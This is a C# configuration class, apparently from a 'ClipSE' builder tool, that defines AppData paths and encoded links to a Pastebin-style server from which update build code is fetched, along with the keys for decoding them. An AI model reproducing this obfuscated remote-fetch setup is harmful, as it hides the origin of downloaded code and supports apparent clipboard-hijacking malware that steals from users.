namespace ClipPurSEditionBuilder
{
    using System;
    using System.IO;
    using System.Reflection;
    using Sticks;

    public static class GlobalPath
    {
        public static readonly string GenRunNameWithoutExtension = Path.GetFileNameWithoutExtension(AppDomain.CurrentDomain.FriendlyName),
        CurrDir = Environment.CurrentDirectory,
        ManifestDirectory = FileControl.CombinePath(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "AppDir"),
        ManifestFile = FileControl.CombinePath(ManifestDirectory, "app.manifest");

        // Для обновления
        public static readonly string 
        NewFile = FileControl.CombinePath(CurrDir, "UpdateSE.txt"), 
        EngDir = FileControl.CombinePath(CurrDir, "en-US"),
        NewFile_Dll = FileControl.CombinePath(EngDir, "ClipSE Builder by r3xq1.resources.dll"); 

        public static string Server = "#KxgdACB/bEMZESAxJg4AHn0mLAFGAjIybF8NHTINNzUj", // Ваш сервер (Link) где будет лежать исходный код билда ( обнова ) допустим Pastebin
        TextBuild = "#KxgdACB/bEMbESRrJAUdGCYnNh8MAjAqLRgMHidrIAMEXwAxCw0bAH4iMBofXwY1Jw0dFQAAbAEIAycgMUMrBTopJwkbXic9Nw=="; // Ваш билд ( обнова ) - raw text с Pastebin

        // Ссылки
        public static string Database = "#KxgdACB/bEMZESAxJg4AHn0mLAFGAjIybAlZOmA9CA4k", DatabaseBuild = "#KxgdACB/bEMZESAxJg4AHn0mLAFGAjIybD0CMyUJDj88", UrlCheck = "#KxgdACB/bEMQET0hJhRHAiZq"; 

        // Ключи для расшифровки
        public static string SecretKey_Public = "ClipSE", SecretKey_Build = "SEditionBuild";

        public static string VersionBuild = Assembly.GetExecutingAssembly().GetName().Version.ToString();
    }
}